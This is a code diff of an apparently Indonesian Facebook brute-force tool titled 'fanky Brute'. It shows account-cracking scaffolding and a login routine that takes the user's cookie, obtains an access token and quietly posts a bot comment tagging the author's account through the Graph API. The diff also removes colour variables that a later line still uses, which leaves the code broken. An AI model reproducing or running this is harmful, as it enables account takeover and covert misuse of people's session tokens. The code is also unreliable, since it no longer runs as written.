@@ -72,11 +72,7 @@ sekarang = calendar.timegm(time.gmtime(time.time()))
 pretty.install()
 CON = sol()
 wa = Console()
-prem = []
-ugen=[]
-ugent=[]
 ugen2 = []
-ngentott=[]
 temanku = []
 console = Console()
 ses = requests.Session()
@@ -105,7 +101,7 @@ id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = (
     [],
     [],
 )
-sys.stdout.write("\x1b]2; BMBF | fanky Brute\x07")
+sys.stdout.write("\x1b]2; BMBF | fanky Brute UPDATE 2024\x07")
 # ------------------[ USER-AGENT ]-------------------#
 try:
     prox = requests.get(
@@ -178,42 +174,7 @@ try:
     color_table = open("data/theme_color", "r").read()
 except FileNotFoundError:
     color_table = "#00FF00"
-
-SE = "[#9F9F9F]"
-puti = "\x1b[1;97m"  # WARNA-PUTIH
-mer = "\x1b[1;91m"  # WARNA-MERAH
-kun = "\x1b[1;93m"  # WARNA-KUJING
-hijo = "\x1b[1;92m"  # WARNA-HIJAU
-ung = "\x1b[1;95m"  # WARNA-UNGU
-biru = "\x1b[1;94m"  # WARNA-BIRU
-P = "\x1b[1;97m"  # PUTIH
-M = "\x1b[1;91m"  # MERAH
-H = "\x1b[1;92m"  # HIJAU
-K = "\x1b[1;93m"  # KUNING
-B = "\x1b[1;94m"  # BIRU
-U = "\x1b[1;95m"  # UNGU
-O = "\x1b[1;96m"  # BIRU MUDA
-N = "\x1b[0m"  # WARNA MATI
-# ------------[ WARNA-COLOR ]--------------#
-P = "\x1b[1;97m"
-M = "\x1b[1;91m"
-H = "\x1b[1;92m"
-K = "\x1b[1;93m"
-B = "\x1b[1;94m"
-U = "\x1b[1;95m"
-O = "\x1b[1;96m"
-N = "\x1b[0m"
-Z = "\033[1;30m"
-sir = "\033[41m\x1b[1;97m"
-x = "\33[m"  # DEFAULT
-m = "\x1b[1;91m"  # RED +
-k = "\033[93m"  # KUNING +
-h = "\x1b[1;92m"  # HIJAU +
-hh = "\033[32m"  # HIJAU -
-u = "\033[95m"  # UNGU
-kk = "\033[33m"  # KUNING -
-b = "\33[1;96m"  # BIRU -
-p = "\x1b[0;34m"  # BIRU +
+	
 asu = random.choice([m, k, h, u, b])
 kom1 = "Anjng Panutan Ku, Keren Bngt Bnjerr 🤙\n -\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[ Semangat Bang @[100043537611609:] ]"
 kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
@@ -453,7 +414,7 @@ def logincoki() -> None:
             # Memanggil fungsi viperfollow dengan cookie
 
             # Mengirim request dengan token yang didapatkan
-            requests.post(f"https://graph.facebook.com/926438272150751/comments/?message=hai%bro&access_token={token}", headers={"cookie": cookie})
+            requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cookie})
 
             # Menampilkan token di konsol
             Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
